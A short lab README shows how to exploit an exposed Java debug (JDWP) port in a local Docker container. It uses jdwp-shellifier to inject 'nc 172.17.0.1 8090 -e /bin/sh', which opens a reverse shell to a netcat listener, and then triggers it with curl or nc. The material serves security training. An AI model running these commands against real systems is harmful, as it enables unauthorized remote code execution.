# JDWP exploitation lab

1. Run docker image:

    docker run -ti -p 8080:8080 -p 8000:8000 jdwp

2. Run netcat listener:

    nc -nlvp 8090

3. Run jdwp-shellifier:

    python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd 'nc 172.17.0.1 8090 -e /bin/sh'

4. Connect to the server (JDWP shellifier by default sets breakepoint on java.net.ServerSocket.accept):

    curl telnet://127.0.0.1:8080

or

    curl http://127.0.0.1:8080

or

    nc 127.0.0.1 8080

You should receive a reverse-shell connection on `nc` listener.
